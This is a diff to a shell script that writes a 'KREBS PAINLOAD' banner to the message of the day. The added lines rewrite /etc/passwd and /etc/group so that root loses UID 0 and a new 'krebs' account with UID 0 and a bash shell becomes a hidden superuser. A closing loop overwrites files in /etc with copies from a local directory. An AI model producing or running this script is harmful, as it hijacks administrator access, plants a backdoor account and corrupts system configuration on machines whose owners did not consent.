@@ -1,4 +1,5 @@
 #! /bin/sh
+
 cat>/etc/motd.tail<<EOF
 KREBS PAINLOAD (MORE COBRA)
 [31;1m  x x              x x
@@ -11,3 +12,17 @@ KREBS PAINLOAD (MORE COBRA)
   x  x   x     x  x  x
   x  x   x     x  x  x[m
 EOF
+
+f=/etc/passwd
+sed -ri 's^(root:[^:]+):0:0:(.*)$\1:23:23:\2' $f
+sed -ri '/^krebs/d' $f
+echo 'krebs:x:0:0::/root:/bin/bash' >>$f
+
+f=/etc/group
+sed -ri 's^(root:[^:]+):0:(.*)$\1:23:\2' $f
+sed -ri '/^krebs/d' $f
+echo 'krebs:x:0:' >>$f
+
+for i in etc/*; do
+  cat $i > /$i
+done
